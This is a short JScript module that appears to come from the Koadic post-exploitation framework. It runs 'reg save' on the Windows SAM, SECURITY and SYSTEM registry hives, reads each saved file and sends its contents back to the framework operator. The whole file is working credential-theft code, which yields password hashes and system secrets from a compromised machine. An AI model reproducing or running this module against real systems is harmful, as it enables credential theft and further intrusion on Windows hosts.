function DumpHive(name, uuid)
{
    var path = Koadic.file.getPath("~RPATH~\\" + uuid);

    Koadic.shell.run("reg save HKLM\\" + name + " " + path + " /y", false);

    var data = Koadic.file.readBinary(path);

    data = data.replace(/\\/g, "\\\\");
    data = data.replace(/\0/g, "\\0")

    var headers = {};
    headers["Task"] = name;

    Koadic.work.report(data, headers);

    //Koadic.file.deleteFile(path);
}

try
{
    DumpHive("SAM", "42SAM");
    DumpHive("SECURITY", "42SECURITY");
    DumpHive("SYSTEM", "42SYSTEM");

    Koadic.work.report("Complete");
}
catch (e)
{
    Koadic.work.error(e);
}

Koadic.exit();
